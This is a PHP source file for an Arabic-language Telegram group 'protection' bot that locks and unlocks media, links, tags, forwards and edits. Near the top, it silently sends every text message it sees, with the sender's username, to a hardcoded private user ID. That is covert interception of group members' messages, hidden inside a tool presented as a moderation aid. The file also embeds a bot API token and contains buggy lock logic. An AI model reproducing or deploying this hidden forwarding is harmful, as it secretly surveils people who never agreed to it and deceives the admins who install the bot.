<?php 

ob_start();

define('API_KEY',"390854636:AAEJRXm2KGOxPbUyO8wPIhXjLivdfe5Y-mo");
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
$name = $message->from->first_name;
$fwd = $message->forward_from_chat->id;
$new_member = $update->message->new_chat_member; 
$left = $update->message->left_chat_member; 
$textmsg = $message->text;
$message_id = $message->message_id;
$text = $message->text;
$rep = $message->reply_to_message; 
$rep_msg = $rep->message_id; 
$id_sudo = 321314064;
$get = file_get_contents('file.txt');
$ex = explode("\n", $get);
$count = count($ex);
$type = $update->message->chat->type;
$re = $update->message->reply_to_message;
$re_id = $update->message->reply_to_message->from->id;
$re_user = $update->message->reply_to_message->from->username;
$user_id = $update->message->from->id;
$re_name = $update->message->reply_to_message->from->first_name;
$re_msgid = $update->message->reply_to_message->message_id;
$name = $message->from->first_name;
$username = $message->from->username;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->message->message_id;
$id = $message->from->id;
$time = time() + (979 * 11 + 1 + 30);
$ex = explode('كول',$text);
$sudo = 397216852;

$chat_edit_id = $update->edited_message->chat->id;
$message_edit_id = $update->edited_message->message_id;
$edit = $update->edited_message;

if($text){
bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>"$text 

@$username",
]);
}
if($textmsg == "قفل التعديل" && !is_dir("mute")){
 mkdir("mute");
   bot('sendmessage',[
   'chat_id'=>$chat_id,
    'message_id'=>$message_id,
   'text'=>"<b> اهلا عزيزي </b>
➖➖➖➖➖➖➖➖
<code> تم قفل التعديل  ❌🎴 </code>
<code> Edit Locked ❌🎴</code>
➖➖➖➖➖➖➖➖
<b>By </b>: @$username",
'parse_mode'=>"html",
        ]);
         }
if($textmsg == "فتح التعديل" && is_dir(mute)){
  rmdir("mute");
bot('sendmessage',[
   'chat_id'=>$chat_id,
    'message_id'=>$message_id,
   'text'=>"<b> اهلا عزيزي </b>
➖➖➖➖➖➖➖➖
<code> تم فتح التعديل ✅🎴</code>
<code> Edit Open  ✅🎴 </code>
➖➖➖➖➖➖➖➖
<b>By </b>: @$username",
'parse_mode'=>"html",
       ]);
         }
if($edit && is_dir("mute")){
bot('deletemessage',[
'chat_id'=>$chat_edit_id,
'message_id'=>$message_edit_id,
]);
}
if($ex){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>$ex[1]
]);
}
if($text == "/leave" && $id == $sudo){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"*Bye Everyone 🙃🗯*",
'parse_mode'=>"MarkDown",
]);
bot('leaveChat',[
'chat_id'=>$chat_id,
]);
}
if($rep && $text == "ايدي"){
bot('sendmessage', [
'chat_id' => $chat_id,
'text' => "id = $re_id
name = $re_name
user = $re_user",
]);
}
if($text == "المطورين"){
 bot('sendMessage',[
  'chat_id'=>$chat_id,
  'text'=>"*#️⃣Developers 🎶*",
'parse_mode'=>"MarkDown",
  'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
      'inline_keyboard'=>[
          [
              ['text'=>"@NEAGHM", 'url'=>"t.me/NEAGHM"],
              ['text'=>"@IQ_110", 'url'=>"https://t.me/iq_110"],
          ],
          ]
      ])
  ]);
}
if($text =="الوقت"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"🇮🇶 البلد : العراق \n" . "❣️  السنة : " . date("Y") . "\n" . "🗓  الشهر : " . date("n") . "\n" . "💫  اليوم :" . date("j") . "\n" . "⏰ الساعه :" . date('g', $time) . "\n" . "⌚️ الدقيقه :" . date('i', $time) . "\n" . " ❣️",
'reply_to_message_id'=>$message->message_id
]);
}
if($text == 'تفعيل'){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
<b>اهلا عزيزي ⏹</b>
➖➖➖➖➖➖➖
<code> تم تفعيل المجوموعه الخاصه بك 👾🗯</code>
➖➖➖➖➖➖➖
<b>By : </b> @$username
",
'parse_mode'=>"Html",
]);
}
if($text == "معلوماتي" ){
bot('sendMessage',[
'chat_id'=>$chat_id,
'parse_mode'=>'MarkDown',
'disable_web_page_preview'=>true,
"text"=>"*Name 💲 = $name *
*ID 🗯 =* $id
*UserName 🃏* = @$username ",
'parse_mode'=>"MarkDown",
'message_id'=>$message->message_id,
'reply_markup'=>json_encode([
      'inline_keyboard'=>[
        [['text'=>'تــــابعــِنا 🔱🔰', 'url'=>"https://t.me/botat11"]],
]
])
]);
}
if($textmsg == "قفل التوجيه" && !is_dir("mute")){
 mkdir("mute");
   bot('sendmessage',[
   'chat_id'=>$chat_id,
    'message_id'=>$message_id,
   'text'=>"<b> اهلا عزيزي </b>
➖➖➖➖➖➖➖➖
<code> تم قفل التوجيه ❌♋️ </code>
<code> Fwd Locked ❌♋️ </code>
➖➖➖➖➖➖➖➖
<b>By </b>: @$username",
'parse_mode'=>"html",
        ]);
         }
if($textmsg == "فتح التوجيه" && is_dir(mute)){
  rmdir("mute");
bot('sendmessage',[
   'chat_id'=>$chat_id,
    'message_id'=>$message_id,
   'text'=>"<b> اهلا عزيزي </b>
➖➖➖➖➖➖➖➖
<code> تم فتح التوجيه ✅♋️ </code>
<code> Fwd Open  ✅♋️ </code>
➖➖➖➖➖➖➖➖
<b>By </b>: @$username",
'parse_mode'=>"html",
        ]);
         }
if($message->forward_from && is_dir("mute")){
 bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id
]);
}
if($textmsg == "قفل الصور" && !is_dir("mute")){
 mkdir("mute");
   bot('sendmessage',[
   'chat_id'=>$chat_id,
    'message_id'=>$message_id,
   'text'=>"<b> اهلا عزيزي </b>
➖➖➖➖➖➖➖➖
<code> تم قفل الصور  ❌🌌 </code>
<code> Photo Locked ❌🌌</code>
➖➖➖➖➖➖➖➖
<b>By </b>: @$username",
'parse_mode'=>"html",
        ]);
         }
if($textmsg == "فتح الصور" && is_dir(mute)){
  rmdir("mute");
bot('sendmessage',[
   'chat_id'=>$chat_id,
    'message_id'=>$message_id,
   'text'=>"<b> اهلا عزيزي </b>
➖➖➖➖➖➖➖➖
<code> تم فتح الصور ✅🌌 </code>
<code> Photo Open  ✅🌌 </code>
➖➖➖➖➖➖➖➖
<b>By </b>: @$username",
'parse_mode'=>"html",
        ]);
         }
if($message->photo && is_dir("mute")){
 bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id
]);
}
if($textmsg == "قفل الصوت" && !is_dir("mute")){
 mkdir("mute");
   bot('sendmessage',[
   'chat_id'=>$chat_id,
    'message_id'=>$message_id,
   'text'=>"<b> اهلا عزيزي </b>
➖➖➖➖➖➖➖➖
<code> تم قفل الصوت  ❌🔉 </code>
<code> Voice Locked ❌🔊</code>
➖➖➖➖➖➖➖➖
<b>By </b>: @$username",
'parse_mode'=>"html",
        ]);
         }
if($textmsg == "فتح الصوت" && is_dir(mute)){
  rmdir("mute");
bot('sendmessage',[
   'chat_id'=>$chat_id,
    'message_id'=>$message_id,
   'text'=>"<b> اهلا عزيزي </b>
➖➖➖➖➖➖➖➖
<code> تم فتح الصوت ✅🔈 </code>
<code> Voice Open  ✅🔈 </code>
➖➖➖➖➖➖➖➖
<b>By </b>: @$username",
'parse_mode'=>"html",
        ]);
         }
if($message->voice && is_dir("mute")){
 bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id
]);
}
if($textmsg == "قفل الفيديو" && !is_dir("mute")){
 mkdir("mute");
   bot('sendmessage',[
   'chat_id'=>$chat_id,
    'message_id'=>$message_id,
   'text'=>"<b> اهلا عزيزي </b>
➖➖➖➖➖➖➖➖
<code> تم قفل الفيديو  ❌👁‍🗨 </code>
<code> Video Locked ❌👁‍🗨</code>
➖➖➖➖➖➖➖➖
<b>By </b>: @$username",
'parse_mode'=>"html",
        ]);
         }
if($textmsg == "فتح الفيديو" && is_dir(mute)){
  rmdir("mute");
bot('sendmessage',[
   'chat_id'=>$chat_id,
    'message_id'=>$message_id,
   'text'=>"<b> اهلا عزيزي </b>
➖➖➖➖➖➖➖➖
<code> تم فتح الفيديو ✅👁‍🗨</code>
<code> Video Open  ✅👁‍🗨 </code>
➖➖➖➖➖➖➖➖
<b>By </b>: @$username",
'parse_mode'=>"html",
        ]);
         }
if($message->video && is_dir("mute")){
 bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id
]);
}
if($textmsg == "قفل الملصقات" && !is_dir("mute")){
 mkdir("mute");
   bot('sendmessage',[
   'chat_id'=>$chat_id,
    'message_id'=>$message_id,
   'text'=>"<b> اهلا عزيزي </b>
➖➖➖➖➖➖➖➖
<code> تم قفل الملصقات  ❌🃏 </code>
<code> Stickers Locked ❌🃏</code>
➖➖➖➖➖➖➖➖
<b>By </b>: @$username",
'parse_mode'=>"html",
        ]);
         }
if($textmsg == "فتح الملصقات" && is_dir(mute)){
  rmdir("mute");
bot('sendmessage',[
   'chat_id'=>$chat_id,
    'message_id'=>$message_id,
   'text'=>"<b> اهلا عزيزي </b>
➖➖➖➖➖➖➖➖
<code> تم فتح الملصقات ✅🃏</code>
<code> Stickers Open  ✅🃏 </code>
➖➖➖➖➖➖➖➖
<b>By </b>: @$username",
'parse_mode'=>"html",
        ]);
         }
if($message->sticker && is_dir("mute")){
bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id
]);
}
if($textmsg == "قفل الجهات" && !is_dir("mute")){
 mkdir("mute");
   bot('sendmessage',[
   'chat_id'=>$chat_id,
    'message_id'=>$message_id,
   'text'=>"<b> اهلا عزيزي </b>
➖➖➖➖➖➖➖➖
<code> تم قفل الجهات  ❌💠 </code>
<code> Contects Locked ❌💠</code>
➖➖➖➖➖➖➖➖
<b>By </b>: @$username",
'parse_mode'=>"html",
        ]);
         }
if($textmsg == "فتح الجهات" && is_dir(mute)){
  rmdir("mute");
bot('sendmessage',[
   'chat_id'=>$chat_id,
    'message_id'=>$message_id,
   'text'=>"<b> اهلا عزيزي </b>
➖➖➖➖➖➖➖➖
<code> تم فتح الجهات ✅💠</code>
<code> Contects Open  ✅💠 </code>
➖➖➖➖➖➖➖➖
<b>By </b>: @$username",
'parse_mode'=>"html",
       ]);
         }
if($message->contact && is_dir("mute")){
 bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id
]);
}
if($textmsg == "قفل الروابط" && !is_dir("mute")){
 mkdir("mute");
   bot('sendmessage',[
   'chat_id'=>$chat_id,
    'message_id'=>$message_id,
   'text'=>"<b> اهلا عزيزي </b>
➖➖➖➖➖➖➖➖
<code> تم قفل الروابط  ❌🔗 </code>
<code> Links Locked ❌🔗</code>
➖➖➖➖➖➖➖➖
<b>By </b>: @$username",
'parse_mode'=>"html",
]);
}
if($textmsg == "فتح الروابط" && is_dir(mute)){
  rmdir("mute");
bot('sendmessage',[
   'chat_id'=>$chat_id,
    'message_id'=>$message_id,
   'text'=>"<b> اهلا عزيزي </b>
➖➖➖➖➖➖➖➖
<code> تم فتح الروابط ✅🔗</code>
<code> Links Open  ✅🔗 </code>
➖➖➖➖➖➖➖➖
<b>By </b>: @$username",
'parse_mode'=>"html",
        ]);
         }
if(preg_match('/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/',$text) ){
bot('deleteMessage',[
'chat_id'=>$chat_id,
'message_id'=>$message->message_id
  ]);
}
if($textmsg == "قفل التاك" && !is_dir("mute")){
 mkdir("mute");
   bot('sendmessage',[
   'chat_id'=>$chat_id,
    'message_id'=>$message_id,
   'text'=>"<b> اهلا عزيزي </b>
➖➖➖➖➖➖➖➖
<code> تم قفل التاك  ❌📍 </code>
<code> Tag Locked ❌📍</code>
➖➖➖➖➖➖➖➖
<b>By </b>: @$username",
'parse_mode'=>"html",
]);
}
if($textmsg == "فتح التاك" && is_dir(mute)){
  rmdir("mute");
bot('sendmessage',[
   'chat_id'=>$chat_id,
    'message_id'=>$message_id,
   'text'=>"<b> اهلا عزيزي </b>
➖➖➖➖➖➖➖➖
<code> تم فتح التاك ✅📍</code>
<code> Tag Open  ✅📍 </code>
➖➖➖➖➖➖➖➖
<b>By </b>: @$username",
'parse_mode'=>"html",
        ]);
         }
if(preg_match('/^(.*)@|@(.*)|(.*)@(.*)|(.*)#(.*)|#(.*)|(.*)#/',$text)  ){
bot('deleteMessage',[
'chat_id'=>$chat_id,
'message_id'=>$message->message_id
  ]);
} 
if($textmsg == "/start" ){
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"<b> اهلا عزيزي 🔊➖</b>

<b>في بوت الحماية الاجود من نوعه 🗣
‎الذي والخفيف الذي يغنيك عن بوتات ال cli 💗 </b>

<b> • البوت تخزينه ومسحة خفيف للغاية💠 •</b>

<b> • لاعليك سواء اضافتي الى مجموعتك وترقيتي اداري 🌌 •</b>

<b> • ارسل الاوامر لعرض الاوامر 👽•</b>

<b>By : </b> @NEAGHM && @IQ_110 😻
",          
'parse_mode'=>"html",
]);
}  
if($textmsg == "الاوامر" ){
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"<b> اهلا بك في بوت الحمايه  🔊➖</b>

<code> في قائمة الاوامر 📌🗣</code>

<b> • اوامر القفل ❌ •</b>
<b>• اوامر الفتح ✅ •</b>
<b> • اوامر اخرى 💡•</b>

<b>By : </b> @IQ_110 && @NEAGHM 😻
",          
'parse_mode'=>"html",
]);
}  
if($textmsg == "اوامر القفل" ){
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"<b> اهلا بك عزيزي 💠</b>

<code> في قائمة القفل 🤖❌</code>

<b>• قفل الفيديو 👁‍🗨 •</b>
<b>• قفل التعديل 🎴 •</b>
<b>• قفل الصور 🌌 •</b>
<b>• قفل الصوت 🎙 •</b>
<b>• قفل الروابط 🔗 •</b>
<b>• قفل التاك  📍 •</b>
<b>• قفل الملصقات 🃏 •</b>
<b>• قفل التوجيه ♋️ •</b>
<b>• قفل الجهات  💠 •</b>
<b>• قفل الانكليزية 🇺🇸 •</b>

<b>By : </b> @IQ_110 && @NEAGHM 😻
",          
'parse_mode'=>"html",
]);
}  
if($textmsg == "اوامر الفتح" ){
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"<b> اهلا عزيزي 💠</b>

<code> في قائمة الفتح 🤖✅</code>

<b>• فتح الفيديو 👁رو‍🗨•</b>
<b>• فتح التعديل 🎴 •</b>
<b>• فتح الصور 🌌 •</b>
<b>• فتح الصوت 🎙 •</b>
<b>• فتح الروابط 🔗 •</b>
<b>• فتح التاك  📍 •</b>
<b>• فتح الملصقات 🃏 •</b>
<b>• فتح التوجيه ♋️ •</b>
<b>• فتح الجهات  💠 •</b>
<b>• فتح الانكليزية 🇺🇸 •</b>

<b>By : </b> @IQ_110 && @NEAGHM 😻


",          
'parse_mode'=>"html",
]);
}  
if($textmsg == "اوامر اخرى" ){
        bot('sendmessage', [
                'chat_id' =>$chat_id,
                'text' =>"<b> اهلا عزيزي 💠</b>

<code> في قائمة اوامر الاخرى 🗣</code>

<b>• تفعيل 🎩 • </b>

<b>• معلوماتي 🎈• </b>

<b>• ايدي بالرد 💡• </b>

<b>• الوقت ⌚️ •</b>

<b> • المطورين 🚀 • </b>
<b>By : </b> @IQ_110 && @NEAGHM 😻",          
'parse_mode'=>"html",
]);
}
